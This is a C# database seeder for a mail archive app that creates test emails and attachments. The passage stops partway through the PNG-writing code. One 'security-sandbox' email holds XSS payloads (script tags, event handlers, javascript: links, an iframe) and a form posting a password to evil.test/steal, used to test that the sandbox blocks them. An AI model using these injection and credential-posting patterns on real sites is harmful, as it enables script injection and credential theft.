using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using MailArchive.Domain.Entities;
using MailArchive.Domain.Enums;
using Microsoft.EntityFrameworkCore;

namespace MailArchive.Persistence.Seed;

/// <summary>
/// Adds test emails to the mailboxes of one user, to check how the UI renders HTML
/// bodies and how attachments of different types download.
///
/// There are 13 different test emails. With a count, they are repeated in order until the
/// count is reached; repeats get a "#2", "#3"... suffix on the subject and an older date.
///
/// Safe to run more than once: emails are matched by MessageHash ("seed-test-*") and
/// skipped if they already exist, so running again with a bigger count only adds the
/// difference. Attachment files are written once under
/// {contentRoot}/seed-storage/test-emails/{sha256}/{fileName} and stored as a relative
/// path, which AttachmentsController resolves against ContentRootPath.
///
/// Usage from Program.cs (after app is built):
///   dotnet run -- --seed-test-emails user@example.com
///   dotnet run -- --seed-test-emails user@example.com --mailbox "User Archive" --count 200
///   dotnet run -- --remove-test-emails user@example.com [--mailbox "User Archive"]
/// </summary>
public static class TestEmailSeeder
{
    private const string MessageHashPrefix = "seed-test-";
    private const string ImportBatchHash = "seed-test-emails-v1";
    private const string ImportBatchFileName = "test-emails-seed.pst";
    private const string DefaultMailboxName = "Test Archive";
    private const string StorageFolder = "seed-storage/test-emails";
    private const int MaxCount = 100_000;
    private const int SaveEvery = 200;

    /// <summary>
    /// Seeds test emails for the user with this email and returns how many were added.
    /// </summary>
    /// <param name="mailboxName">
    /// Only seed the user's mailbox with this display name; it is created if the user has none
    /// by that name. When null, every mailbox the user owns is seeded (and a "Test Archive"
    /// mailbox is created if they have none).
    /// </param>
    /// <param name="count">
    /// How many test emails each mailbox should end up with. When null, one of each (13).
    /// </param>
    public static async Task<int> SeedForUserAsync(
        MailArchiveDbContext db,
        string userEmail,
        string? contentRootPath = null,
        string? mailboxName = null,
        int? count = null)
    {
        if (count is < 1 or > MaxCount)
            throw new ArgumentOutOfRangeException(nameof(count), $"Count must be between 1 and {MaxCount}.");

        contentRootPath ??= Directory.GetCurrentDirectory();

        var user = await db.Users.FirstOrDefaultAsync(x => x.Email == userEmail)
            ?? throw new InvalidOperationException($"User '{userEmail}' was not found.");

        var mailboxes = await db.Mailboxes
            .Where(x => x.OwnerUserId == user.Id && (mailboxName == null || x.DisplayName == mailboxName))
            .ToListAsync();

        if (mailboxes.Count == 0)
            mailboxes.Add(await CreateMailboxAsync(db, user.Id, mailboxName ?? DefaultMailboxName));

        var files = new TestFiles();
        var templates = BuildEmails(user, files);
        var total = count ?? templates.Count;
        var storedFiles = new Dictionary<TestFile, (string RelativePath, string Hash)>(ReferenceEqualityComparer.Instance);
        var added = 0;

        foreach (var mailbox in mailboxes)
        {
            var batch = await GetOrCreateImportBatchAsync(db, mailbox.Id);

            var existingHashes = (await db.Emails
                    .Where(x => x.MailboxId == mailbox.Id && x.MessageHash.StartsWith(MessageHashPrefix))
                    .Select(x => x.MessageHash)
                    .ToListAsync())
                .ToHashSet();

            var pending = 0;

            for (var i = 0; i < total; i++)
            {
                var spec = templates[i % templates.Count];
                var round = i / templates.Count;

                // Round 0 keeps the original hash, so earlier runs without a count are recognised
                var messageHash = round == 0
                    ? MessageHashPrefix + spec.Key
                    : $"{MessageHashPrefix}{spec.Key}-{round + 1}";

                if (existingHashes.Contains(messageHash))
                    continue;

                var attachments = new List<Attachment>();

                foreach (var file in spec.Files)
                {
                    if (!storedFiles.TryGetValue(file, out var stored))
                    {
                        stored = await StoreFileAsync(contentRootPath, file);
                        storedFiles[file] = stored;
                    }

                    attachments.Add(new Attachment
                    {
                        Id = Guid.NewGuid(),
                        FileName = file.FileName,
                        ContentType = file.ContentType,
                        SizeBytes = file.Content.Length,
                        StoragePath = stored.RelativePath,
                        ContentHash = stored.Hash,
                        CreatedAt = DateTime.UtcNow
                    });
                }

                var subject = round > 0 && spec.Subject.Length > 0
                    ? $"{spec.Subject} #{round + 1}"
                    : spec.Subject;
                var sentAt = spec.SentAt.AddDays(-round);

                db.Emails.Add(new Email
                {
                    Id = Guid.NewGuid(),
                    MailboxId = mailbox.Id,
                    ImportBatchId = batch.Id,
                    InternetMessageId = $"<{messageHash}@mailarchive.test>",
                    MessageHash = messageHash,
                    FolderPath = spec.Folder,
                    SenderEmail = spec.SenderEmail,
                    SenderName = spec.SenderName,
                    Subject = subject,
                    BodyText = spec.BodyText,
                    BodyHtml = spec.BodyHtml,
                    SentAt = sentAt,
                    ReceivedAt = sentAt.AddMinutes(2),
                    HasAttachments = attachments.Count > 0,
                    CreatedAt = DateTime.UtcNow,
                    Recipients = spec.Recipients
                        .Select(r => new EmailRecipient
                        {
                            Id = Guid.NewGuid(),
                            RecipientType = r.Type,
                            RecipientEmail = r.Email,
                            RecipientName = r.Name
                        })
                        .ToList(),
                    Attachments = attachments
                });

                added++;

                if (++pending >= SaveEvery)
                {
                    await db.SaveChangesAsync();
                    db.ChangeTracker.Clear();
                    pending = 0;
                }
            }

            await db.SaveChangesAsync();
            db.ChangeTracker.Clear();
            await UpdateImportBatchMetricsAsync(db, batch.Id);
        }

        return added;
    }

    /// <summary>
    /// Removes the test emails (and their test import batch) from the user's mailboxes, or
    /// only from the mailbox with this display name. Attachment files on disk are left in
    /// place because they are shared. Returns how many emails were removed.
    /// </summary>
    public static async Task<int> RemoveForUserAsync(
        MailArchiveDbContext db,
        string userEmail,
        string? mailboxName = null)
    {
        var user = await db.Users.FirstOrDefaultAsync(x => x.Email == userEmail)
            ?? throw new InvalidOperationException($"User '{userEmail}' was not found.");

        var mailboxIds = await db.Mailboxes
            .Where(x => x.OwnerUserId == user.Id && (mailboxName == null || x.DisplayName == mailboxName))
            .Select(x => x.Id)
            .ToListAsync();

        var emails = await db.Emails
            .Where(x => mailboxIds.Contains(x.MailboxId) && x.MessageHash.StartsWith(MessageHashPrefix))
            .ToListAsync();

        db.Emails.RemoveRange(emails);
        await db.SaveChangesAsync();

        var batches = await db.ImportBatches
            .Where(x => mailboxIds.Contains(x.MailboxId) && x.PstHash == ImportBatchHash)
            .ToListAsync();

        db.ImportBatches.RemoveRange(batches);
        await db.SaveChangesAsync();

        return emails.Count;
    }

    private static async Task<Mailbox> CreateMailboxAsync(MailArchiveDbContext db, Guid ownerUserId, string displayName)
    {
        var mailbox = new Mailbox
        {
            Id = Guid.NewGuid(),
            OwnerUserId = ownerUserId,
            DisplayName = displayName,
            MailboxSource = MailboxSourceType.PST,
            IsAssigned = true,
            CreatedAt = DateTime.UtcNow
        };

        db.Mailboxes.Add(mailbox);
        await db.SaveChangesAsync();

        return mailbox;
    }

    private static async Task<ImportBatch> GetOrCreateImportBatchAsync(MailArchiveDbContext db, Guid mailboxId)
    {
        var existing = await db.ImportBatches.FirstOrDefaultAsync(x =>
            x.MailboxId == mailboxId &&
            x.PstHash == ImportBatchHash);

        if (existing != null)
            return existing;

        var batch = new ImportBatch
        {
            Id = Guid.NewGuid(),
            MailboxId = mailboxId,
            PstFilename = ImportBatchFileName,
            PstHash = ImportBatchHash,
            Status = ImportBatchStatus.Completed,
            StartedAt = DateTime.UtcNow.AddMinutes(-5),
            CompletedAt = DateTime.UtcNow,
            TotalMessages = 0,
            ImportedMessages = 0,
            FailedMessages = 0
        };

        db.ImportBatches.Add(batch);
        await db.SaveChangesAsync();

        return batch;
    }

    private static async Task UpdateImportBatchMetricsAsync(MailArchiveDbContext db, Guid importBatchId)
    {
        var batch = await db.ImportBatches.FirstAsync(x => x.Id == importBatchId);
        var total = await db.Emails.CountAsync(x => x.ImportBatchId == importBatchId);

        batch.TotalMessages = total;
        batch.ImportedMessages = total;
        batch.FailedMessages = 0;
        batch.Status = ImportBatchStatus.Completed;
        batch.CompletedAt ??= DateTime.UtcNow;

        await db.SaveChangesAsync();
    }

    private static async Task<(string RelativePath, string Hash)> StoreFileAsync(string contentRootPath, TestFile file)
    {
        var hash = Convert.ToHexString(SHA256.HashData(file.Content)).ToLowerInvariant();
        var relativePath = $"{StorageFolder}/{hash}/{file.FileName}";
        var absolutePath = Path.GetFullPath(Path.Combine(contentRootPath, relativePath));

        if (!File.Exists(absolutePath))
        {
            Directory.CreateDirectory(Path.GetDirectoryName(absolutePath)!);
            await File.WriteAllBytesAsync(absolutePath, file.Content);
        }

        return (relativePath, hash);
    }

    // ------------------------------------------------------------------
    // Test emails
    // ------------------------------------------------------------------

    private static List<TestEmail> BuildEmails(User owner, TestFiles files)
    {
        var me = new TestRecipient(RecipientType.To, owner.Email, owner.DisplayName);
        var now = DateTime.UtcNow;

        return new List<TestEmail>
        {
            new(
                Key: "newsletter-rich-html",
                Folder: "Inbox",
                SenderEmail: "news@contoso-shop.test",
                SenderName: "Contoso Newsletter",
                Subject: "[Test] Rich HTML newsletter: tables, colours, images, buttons",
                BodyText: "October newsletter. View this email in an HTML capable client.",
                BodyHtml: NewsletterHtml(files.ChartPngBase64),
                SentAt: now.AddDays(-1).AddHours(-3),
                Recipients: new[] { me },
                Files: Array.Empty<TestFile>()),

            new(
                Key: "security-sandbox",
                Folder: "Inbox",
                SenderEmail: "attacker@evil.test",
                SenderName: "Security Test",
                Subject: "[Test] Script and event handlers must NOT run",
                BodyText: "This email contains script tags and event handlers. None of them should execute.",
                BodyHtml: SecurityTestHtml(),
                SentAt: now.AddDays(-1),
                Recipients: new[] { me },
                Files: new[] { files.ScriptHtml }),

            new(
                Key: "plain-text-only",
                Folder: "Inbox",
                SenderEmail: "old.client@legacy.test",
                SenderName: "Legacy Mail Client",
                Subject: "[Test] Plain text only, no HTML body",
                BodyText: PlainTextBody(),
                BodyHtml: null,
                SentAt: now.AddDays(-2),
                Recipients: new[] { me },
                Files: Array.Empty<TestFile>()),

            new(
                Key: "invoice-pdfs",
                Folder: "Inbox/Invoices",
                SenderEmail: "billing@vendor.test",
                SenderName: "Vendor Billing",
                Subject: "[Test] Τιμολόγιο Οκτωβρίου (PDF attachments, Greek file name)",
                BodyText: "Σας επισυνάπτουμε το τιμολόγιο και την αναφορά πωλήσεων.",
                BodyHtml: """
                          <p>Αγαπητέ πελάτη,</p>
                          <p>Σας επισυνάπτουμε το <strong>τιμολόγιο</strong> και την <em>αναφορά πωλήσεων</em>.</p>
                          <p>Check that both PDFs download with their original file names, including the Greek one.</p>
                          """,
                SentAt: now.AddDays(-3),
                Recipients: new[] { me, new TestRecipient(RecipientType.Cc, "accounts@example.test", "Accounts") },
                Files: new[] { files.InvoicePdf, files.GreekPdf }),

            new(
                Key: "attachment-zoo",
                Folder: "Inbox",
                SenderEmail: "qa@example.test",
                SenderName: "QA Team",
                Subject: "[Test] One attachment of every type",
                BodyText: "Every attachment here should download and open in its usual program.",
                BodyHtml: AttachmentZooHtml(),
                SentAt: now.AddDays(-4),
                Recipients: new[] { me },
                Files: new[]
                {
                    files.NotesTxt, files.DataCsv, files.ConfigJson, files.ReportDocx, files.ArchiveZip,
                    files.ChartPng, files.LogoSvg, files.MeetingIcs, files.ForwardedEml,
                    files.UnknownBin, files.EmptyTxt
                }),

            new(
                Key: "large-attachment",
                Folder: "Inbox",
                SenderEmail: "exports@example.test",
                SenderName: "Data Exports",
                Subject: "[Test] Large attachment (about 3 MB)",
                BodyText: "The attached CSV is about 3 MB, to check size display and download time.",
                BodyHtml: "<p>The attached CSV is about <b>3 MB</b>, to check size display and download time.</p>",
                SentAt: now.AddDays(-5),
                Recipients: new[] { me },
                Files: new[] { files.LargeCsv }),

            new(
                Key: "inline-cid-image",
                Folder: "Inbox",
                SenderEmail: "marketing@example.test",
                SenderName: "Marketing",
                Subject: "[Test] Inline image via cid: reference",
                BodyText: "The logo is embedded as an inline (cid:) image.",
                BodyHtml: """
                          <p>Below is an image referenced as <code>cid:chart@seed</code>, the way Outlook embeds inline images:</p>
                          <p><img src="cid:chart@seed" alt="[inline cid image]" width="200" height="120"></p>
                          <p>The same image is also attached as <b>chart.png</b>. The archive has no Content-ID column yet,
                          so today this shows as a broken image; it is here to show that gap.</p>
                          """,
                SentAt: now.AddDays(-6),
                Recipients: new[] { me },
                Files: new[] { files.ChartPng }),

            new(
                Key: "reply-thread",
                Folder: "Inbox/Projects/Archive Rollout",
                SenderEmail: "maria.papadopoulou@example.test",
                SenderName: "Μαρία Παπαδοπούλου",
                Subject: "RE: RE: [Test] Archive rollout plan",
                BodyText: "Sounds good, let's go with Monday.\n\n> On Friday Nikos wrote:\n> Can we start the rollout on Monday?",
                BodyHtml: ReplyThreadHtml(),
                SentAt: now.AddDays(-7),
                Recipients: new[]
                {
                    me,
                    new TestRecipient(RecipientType.To, "nikos@example.test", "Νίκος Γεωργίου"),
                    new TestRecipient(RecipientType.Cc, "pm@example.test", "Project Manager")
                },
                Files: Array.Empty<TestFile>()),

            new(
                Key: "layout-stress",
                Folder: "Inbox",
                SenderEmail: "reports@example.test",
                SenderName: "Reporting Bot",
                Subject: "[Test] Layout stress: wide table, long URL, pre block, fixed overlay",
                BodyText: "Wide table and long unbroken strings, to check that nothing overflows the page.",
                BodyHtml: LayoutStressHtml(),
                SentAt: now.AddDays(-8),
                Recipients: new[] { me },
                Files: Array.Empty<TestFile>()),

            new(
                Key: "unicode-emoji",
                Folder: "Inbox",
                SenderEmail: "unicode@example.test",
                SenderName: "Ελληνικά & Emoji 🎉",
                Subject: "[Test] Ελληνικά, emoji 🚀📎 και κείμενο από δεξιά προς τα αριστερά",
                BodyText: "Καλημέρα! Unicode test with emoji 🚀 and right-to-left text: שלום / مرحبا",
                BodyHtml: UnicodeHtml(),
                SentAt: now.AddDays(-9),
                Recipients: new[] { me },
                Files: Array.Empty<TestFile>()),

            new(
                Key: "no-subject-sent",
                Folder: "Sent Items",
                SenderEmail: owner.Email,
                SenderName: null,
                Subject: "",
                BodyText: "Email with an empty subject, no sender display name, and a Bcc recipient.",
                BodyHtml: "<p>Email with an <b>empty subject</b>, no sender display name, and a <b>Bcc</b> recipient.</p>",
                SentAt: now.AddDays(-10),
                Recipients: new[]
                {
                    new TestRecipient(RecipientType.To, "colleague@example.test", "Colleague"),
                    new TestRecipient(RecipientType.Bcc, "hidden@example.test", null)
                },
                Files: Array.Empty<TestFile>()),

            new(
                Key: "many-recipients",
                Folder: "Inbox",
                SenderEmail: "ceo@example.test",
                SenderName: "Chief Executive",
                Subject: "[Test] Company announcement to many recipients",
                BodyText: "Announcement with a long To and Cc list.",
                BodyHtml: "<h2>Company announcement</h2><p>This email has many To and Cc recipients, to check that the header wraps.</p>",
                SentAt: now.AddDays(-11),
                Recipients: Enumerable.Range(1, 8)
                    .Select(i => new TestRecipient(RecipientType.To, $"employee{i}@example.test", $"Employee {i}"))
                    .Prepend(me)
                    .Concat(Enumerable.Range(1, 5)
                        .Select(i => new TestRecipient(RecipientType.Cc, $"manager{i}@example.test", $"Manager {i}")))
                    .ToArray(),
                Files: Array.Empty<TestFile>()),

            new(
                Key: "old-archived",
                Folder: "Archive/2025",
                SenderEmail: "hr@example.test",
                SenderName: "Human Resources",
                Subject: "[Test] Old email from last year (date sorting)",
                BodyText: "This email is over a year old, to check date sorting and filtering.",
                BodyHtml: "<p>This email is over a year old, to check date sorting and filtering.</p>",
                SentAt: now.AddDays(-400),
                Recipients: new[] { me },
                Files: new[] { files.InvoicePdf })
        };
    }

    private static string NewsletterHtml(string chartPngBase64) => $"""
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f2f4f7;padding:24px 0;">
          <tr><td align="center">
            <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:8px;overflow:hidden;font-family:Arial,sans-serif;">
              <tr><td style="background:#1e3a8a;color:#ffffff;padding:24px;">
                <h1 style="margin:0;font-size:24px;">Contoso Monthly</h1>
                <p style="margin:4px 0 0;opacity:.8;">October edition</p>
              </td></tr>
              <tr><td style="padding:24px;color:#1f2937;">
                <h2 style="color:#1e3a8a;">Sales at a glance</h2>
                <p>The chart below is a <code>data:</code> URI PNG, so it should always show:</p>
                <p><img src="data:image/png;base64,{chartPngBase64}" alt="Embedded chart" width="200" height="120" style="border:1px solid #e5e7eb;"></p>
                <p>This one is a remote image (it shows only if the browser can reach the internet):</p>
                <p><img src="https://picsum.photos/seed/mailarchive/560/180" alt="Remote image" width="560"></p>
                <table width="100%" cellpadding="8" cellspacing="0" style="border-collapse:collapse;margin:16px 0;">
                  <thead>
                    <tr style="background:#e0e7ff;"><th align="left">Region</th><th align="right">Q3</th><th align="right">Q4</th></tr>
                  </thead>
                  <tbody>
                    <tr><td style="border-bottom:1px solid #e5e7eb;">Αθήνα</td><td align="right">12.400 €</td><td align="right" style="color:#15803d;">14.900 €</td></tr>
                    <tr><td style="border-bottom:1px solid #e5e7eb;">Θεσσαλονίκη</td><td align="right">8.150 €</td><td align="right" style="color:#b91c1c;">7.300 €</td></tr>
                    <tr><td>Πάτρα</td><td align="right">4.020 €</td><td align="right" style="color:#15803d;">4.600 €</td></tr>
                  </tbody>
                </table>
                <ul>
                  <li><b>Bold</b>, <i>italic</i>, <u>underline</u>, <s>strike</s>, <mark>highlight</mark></li>
                  <li>A <a href="https://example.com/offers">normal link</a> (should open in a new tab)</li>
                  <li>A <a href="mailto:support@contoso-shop.test">mailto link</a></li>
                </ul>
                <p style="text-align:center;margin:24px 0;">
                  <a href="https://example.com/shop" style="background:#2563eb;color:#ffffff;padding:12px 24px;border-radius:6px;text-decoration:none;display:inline-block;">Shop now</a>
                </p>
                <hr style="border:none;border-top:1px solid #e5e7eb;">
                <p style="font-size:12px;color:#6b7280;">You receive this because you subscribed. <a href="https://example.com/unsubscribe" style="color:#6b7280;">Unsubscribe</a></p>
              </td></tr>
            </table>
          </td></tr>
        </table>
        """;

    private static string SecurityTestHtml() => """
        <style>
          /* Must stay inside the email frame: the app around it must not turn red. */
          body { background: #fff7ed; }
          .warn { color: #9a3412; }
        </style>
        <h2 class="warn">Sandbox test</h2>
        <p>Every item below tries to run JavaScript. <b>If you ever see an alert, a console message from this email,
        or the text "SCRIPT RAN", the sandbox is broken.</b></p>
        <ol>
          <li>Inline script tag:
            <script>alert('XSS: script tag ran'); document.body.insertAdjacentHTML('beforeend', '<h1 style="color:red">SCRIPT RAN</h1>');</script>
            (nothing should happen)</li>
          <li>Broken image with onerror: <img src="does-not-exist.png" onerror="alert('XSS: onerror ran')" alt="[broken image, expected]"></li>
          <li><a href="javascript:alert('XSS: javascript link ran')">javascript: link</a> (clicking must do nothing)</li>
          <li><button onclick="alert('XSS: onclick ran')">Button with onclick</button> (clicking must do nothing)</li>
          <li><div onmouseover="alert('XSS: onmouseover ran')" style="padding:6px;border:1px dashed #9a3412;">Hover me (must do nothing)</div></li>
          <li>SVG with onload: <svg width="20" height="20" onload="alert('XSS: svg onload ran')"><rect width="20" height="20" fill="#9a3412"/></svg></li>
          <li>Form posting elsewhere:
            <form action="https://evil.test/steal" method="post"><input name="password" type="password" placeholder="password"><button type="submit">Submit</button></form>
            (submitting must be blocked)</li>
          <li>Nested iframe: <iframe srcdoc="<script>parent.alert('XSS: nested iframe ran')</script><p>nested frame</p>" width="200" height="40"></iframe></li>
          <li>Overlay attempt: the red box below uses <code>position:fixed</code>; it must stay inside the email area, never over the app.
            <div style="position:fixed;bottom:0;right:0;background:#dc2626;color:#fff;padding:8px;z-index:99999;">fixed overlay</div></li>
        </ol>
        <p>The attached <b>script-test.html</b> also contains a script. It should download as a file, not open inside the app.</p>
        """;

    private static string PlainTextBody() => """
        Hello,

        This email has only a plain text body (BodyHtml is null), the way older clients send it.
        Line breaks and    multiple   spaces should be preserved.

            Indented block:
            - item one
            - item two

        Links are plain text here: https://example.com/a/very/long/path/that/keeps/going/and/going?with=query&params=true

        Ελληνικό κείμενο: Η αρχειοθέτηση ολοκληρώθηκε με επιτυχία.

        --
        Regards,
        Legacy Client
        """;

    private static string AttachmentZooHtml() => """
        <p>This email carries one attachment of every common type. For each one, check:</p>
        <ul>
          <li>the icon and size in the attachment list</li>
          <li>that it downloads with the right name and opens correctly</li>
        </ul>
        <table cellpadding="4" style="border-collapse:collapse;">
          <tr><td>notes.txt</td><td>UTF-8 text with Greek</td></tr>
          <tr><td>data.csv</td><td>small CSV</td></tr>
          <tr><td>config.json</td><td>JSON</td></tr>
          <tr><td>report.docx</td><td>Word document</td></tr>
          <tr><td>archive.zip</td><td>ZIP with two files</td></tr>
          <tr><td>chart.png</td><td>PNG image</td></tr>
          <tr><td>logo.svg</td><td>SVG image</td></tr>
          <tr><td>meeting.ics</td><td>calendar invite</td></tr>
          <tr><td>forwarded-message.eml</td><td>attached email</td></tr>
          <tr><td>data.bin</td><td>no content type (should fall back to application/octet-stream)</td></tr>
          <tr><td>empty.txt</td><td>0 bytes</td></tr>
        </table>
        """;

    private static string ReplyThreadHtml() => """
        <p>Sounds good, let's go with <b>Monday</b>.</p>
        <p>Μαρία</p>
        <blockquote style="margin:0 0 0 8px;padding-left:8px;border-left:3px solid #93c5fd;color:#475569;">
          <p><b>From:</b> Νίκος Γεωργίου<br><b>Sent:</b> Friday<br><b>Subject:</b> RE: Archive rollout plan</p>
          <p>Can we start the rollout on Monday? The import service is ready.</p>
          <blockquote style="margin:0 0 0 8px;padding-left:8px;border-left:3px solid #c4b5fd;">
            <p><b>From:</b> Project Manager<br><b>Subject:</b> Archive rollout plan</p>
            <p>Attached is the plan. Please confirm the start date.</p>
          </blockquote>
        </blockquote>
        """;

    private static string LayoutStressHtml()
    {
        var header = string.Concat(Enumerable.Range(1, 20).Select(i => $"<th style=\"border:1px solid #ccc;padding:4px;\">Column {i}</th>"));
        var rows = string.Concat(Enumerable.Range(1, 5).Select(r =>
            "<tr>" + string.Concat(Enumerable.Range(1, 20).Select(c => $"<td style=\"border:1px solid #ccc;padding:4px;\">R{r}C{c}</td>")) + "</tr>"));

        return $"""
            <h3>Wide table (20 columns)</h3>
            <table style="border-collapse:collapse;">{header}{rows}</table>
            <h3>Long unbroken string</h3>
            <p>https://example.com/{new string('x', 300)}</p>
            <h3>Preformatted block</h3>
            <pre style="background:#f3f4f6;padding:8px;">{System.Net.WebUtility.HtmlEncode("SELECT id, subject FROM emails WHERE mailbox_id = @id ORDER BY received_at DESC LIMIT 50; -- a long line of SQL that should scroll or wrap rather than widen the whole page")}</pre>
            <h3>Oversized image</h3>
            <img src="https://picsum.photos/seed/wide/2400/300" alt="2400px wide remote image" width="2400" height="300">
            """;
    }

    private static string UnicodeHtml() => """
        <h2>Καλημέρα σας! 👋</h2>
        <p>Αυτό το μήνυμα ελέγχει την εμφάνιση <b>ελληνικών</b> χαρακτήρων, τόνων και διαλυτικών: ϊ ΰ ΐ, και emoji 🚀 📎 ✅ 🇬🇷.</p>
        <p dir="rtl" style="background:#f1f5f9;padding:6px;">שלום עולם · مرحبا بالعالم (right-to-left)</p>
        <p>Symbols: € £ ¥ © ® ™ ≠ ≤ ≥ ∞ → ←, and CJK: 你好世界 / こんにちは</p>
        <p>HTML entities: &lt;not a tag&gt; &amp; &quot;quoted&quot; &nbsp;nbsp</p>
        """;

    // ------------------------------------------------------------------
    // Attachment contents
    // ------------------------------------------------------------------

    private sealed class TestFiles
    {
        public TestFile InvoicePdf { get; } = new("invoice-october.pdf", "application/pdf",
            CreatePdf("Invoice INV-2026-10", "Customer: Test User", "Amount due: 1,240.00 EUR", "Due date: 31 October 2026"));

        public TestFile GreekPdf { get; } = new("Αναφορά Πωλήσεων 2026.pdf", "application/pdf",
            CreatePdf("Sales report 2026", "This file has a Greek file name with spaces.", "Check that the downloaded name is intact."));

        public TestFile NotesTxt { get; } = new("notes.txt", "text/plain",
            Encoding.UTF8.GetBytes("Σημειώσεις συνάντησης\n=====================\n- Έλεγχος εισαγωγής PST\n- Unicode: ✅ 🚀\n"));

        public TestFile DataCsv { get; } = new("data.csv", "text/csv",
            Encoding.UTF8.GetBytes("id,name,city,amount\n1,Γιώργος,Αθήνα,120.50\n2,Ελένη,Θεσσαλονίκη,89.90\n3,John,London,45.00\n"));

        public TestFile ConfigJson { get; } = new("config.json", "application/json",
            Encoding.UTF8.GetBytes("{\n  \"archive\": \"Mail Archive\",\n  \"retentionDays\": 3650,\n  \"features\": [\"search\", \"export\"]\n}\n"));

        public TestFile ReportDocx { get; } = new("report.docx",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            CreateDocx("Test report", "This Word document was generated by the test email seeder."));

        public TestFile ArchiveZip { get; } = new("archive.zip", "application/zip",
            CreateZip(("readme.txt", "Files inside a zip attachment."), ("data/numbers.csv", "a,b\n1,2\n3,4\n")));

        public TestFile ChartPng { get; }

        public string ChartPngBase64 { get; }

        public TestFile LogoSvg { get; } = new("logo.svg", "image/svg+xml",
            Encoding.UTF8.GetBytes("""
                <svg xmlns="http://www.w3.org/2000/svg" width="160" height="60" viewBox="0 0 160 60">
                  <rect width="160" height="60" rx="8" fill="#1e3a8a"/>
                  <text x="80" y="38" font-family="Arial" font-size="20" fill="#fff" text-anchor="middle">MailArchive</text>
                </svg>
                """));

        public TestFile MeetingIcs { get; } = new("meeting.ics", "text/calendar",
            Encoding.UTF8.GetBytes(
                "BEGIN:VCALENDAR\r\nVERSION:2.0\r\nPRODID:-//MailArchive//Seed//EN\r\nBEGIN:VEVENT\r\n" +
                "UID:seed-test-meeting@mailarchive.test\r\nDTSTAMP:20261014T090000Z\r\n" +
                "DTSTART:20261020T090000Z\r\nDTEND:20261020T100000Z\r\nSUMMARY:Archive rollout meeting\r\n" +
                "END:VEVENT\r\nEND:VCALENDAR\r\n"));

        public TestFile ForwardedEml { get; } = new("forwarded-message.eml", "message/rfc822",
            Encoding.UTF8.GetBytes(
                "From: Original Sender <original@example.test>\r\nTo: someone@example.test\r\n" +
                "Subject: Original message\r\nDate: Mon, 12 Oct 2026 10:00:00 +0000\r\n" +
                "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n" +
                "This is the forwarded original message.\r\n"));

        public TestFile ScriptHtml { get; } = new("script-test.html", "text/html",
            Encoding.UTF8.GetBytes("<!doctype html><html><body><h1>Downloaded HTML file</h1><script>alert('This ran because the file was opened, not because the app rendered it')</script></body></html>"));

        public TestFile UnknownBin { get; } = new("data.bin", null,
            Enumerable.Range(0, 1024).Select(i => (byte)(i % 256)).ToArray());

        public TestFile EmptyTxt { get; } = new("empty.txt", "text/plain", Array.Empty<byte>());

        public TestFile LargeCsv { get; } = new("large-export.csv", "text/csv", CreateLargeCsv(3 * 1024 * 1024));

        public TestFiles()
        {
            var png = CreatePng(200, 120);
            ChartPng = new TestFile("chart.png", "image/png", png);
            ChartPngBase64 = Convert.ToBase64String(png);
        }
    }

    /// <summary>A small valid PDF with one page of Helvetica text (ASCII only).</summary>
    private static byte[] CreatePdf(params string[] lines)
    {
        static string Escape(string s) => s.Replace("\\", "\\\\").Replace("(", "\\(").Replace(")", "\\)");

        var text = new StringBuilder("BT\n/F1 20 Tf\n50 740 Td\n24 TL\n");
        foreach (var line in lines)
            text.Append('(').Append(Escape(line)).Append(") Tj T*\n");
        text.Append("ET\n");
        var stream = text.ToString();

        var objects = new[]
        {
            "<< /Type /Catalog /Pages 2 0 R >>",
            "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>",
            $"<< /Length {Encoding.ASCII.GetByteCount(stream)} >>\nstream\n{stream}endstream",
            "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
        };

        var pdf = new StringBuilder("%PDF-1.4\n");
        var offsets = new List<int>();

        for (var i = 0; i < objects.Length; i++)
        {
            offsets.Add(Encoding.ASCII.GetByteCount(pdf.ToString()));
            pdf.Append($"{i + 1} 0 obj\n{objects[i]}\nendobj\n");
        }

        var xrefOffset = Encoding.ASCII.GetByteCount(pdf.ToString());
        pdf.Append($"xref\n0 {objects.Length + 1}\n0000000000 65535 f \n");
        foreach (var offset in offsets)
            pdf.Append($"{offset:D10} 00000 n \n");
        pdf.Append($"trailer\n<< /Size {objects.Length + 1} /Root 1 0 R >>\nstartxref\n{xrefOffset}\n%%EOF\n");

        return Encoding.ASCII.GetBytes(pdf.ToString());
    }

    /// <summary>A gradient PNG with a simple bar chart, built without any imaging library.</summary>
    private static byte[] CreatePng(int width, int height)
    {
        var bars = new[] { 40, 75, 55, 95, 70 };
        var raw = new byte[height * (width * 3 + 1)];

        for (var y = 0; y < height; y++)
        {
            var row = y * (width * 3 + 1);
            raw[row] = 0; // filter: none

            for (var x = 0; x < width; x++)
            {
                var bar = x / (width / bars.Length);
                var inBar = bar < bars.Length && x % (width / bars.Length) > 6 && height - y <= bars[bar];
                var p = row + 1 + x * 3;

                raw[p] = inBar ? (byte)37 : (byte)(230 - y / 4);
                raw[p + 1] = inBar ? (byte)99 : (byte)(236 - y / 4);
                raw[p + 2] = inBar ? (byte)235 : (byte)250;
            }
        }

        byte[] compressed;
        using (var ms = new MemoryStream())
        {
            using (var z = new ZLibStream(ms, CompressionLevel.Optimal, leaveOpen: true))
                z.Write(raw);
            compressed = ms.ToArray();
        }

        var ihdr = new byte[13];
        WriteBigEndian(ihdr, 0, width);
        WriteBigEndian(ihdr, 4, height);
        ihdr[8] = 8; // bit depth
        ihdr[9] = 2; // colour type: RGB

        using var png = new MemoryStream();
        png.Write(new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A });
        WritePngChunk(png, "IHDR", ihdr);
        WritePngChunk(png, "IDAT", compressed);
        WritePngChunk(png, "IEND", Array.Empty<byte>());

        return png.ToArray();
    }

    private static void WritePngChunk(Stream output, string type, byte[] data)
    {
        var header = new byte[8];
        WriteBigEndian(header, 0, data.Length);
        Encoding.ASCII.GetBytes(type, 0, 4, header, 4);

        var crcInput = new byte[4 + data.Length];
        Array.Copy(header, 4, crcInput, 0, 4);
